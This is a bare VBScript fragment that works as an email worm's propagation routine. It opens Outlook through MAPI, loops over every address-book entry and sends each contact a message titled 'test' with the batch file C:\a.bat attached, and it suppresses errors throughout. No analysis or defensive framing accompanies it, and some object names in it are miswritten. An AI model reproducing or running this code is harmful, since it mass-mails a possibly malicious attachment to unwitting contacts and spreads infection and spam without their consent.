dim x 
on error resume next 
Set fso =" Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.Application") 
Set out=WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
Set ae=a.AddressEntries 
For x=1 To ae.Count 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="test" 
Mail.Body="test" 
Mail.Attachments.Add("C:\a.bat") 
Mail.Send 
Next 
ol.Quit 
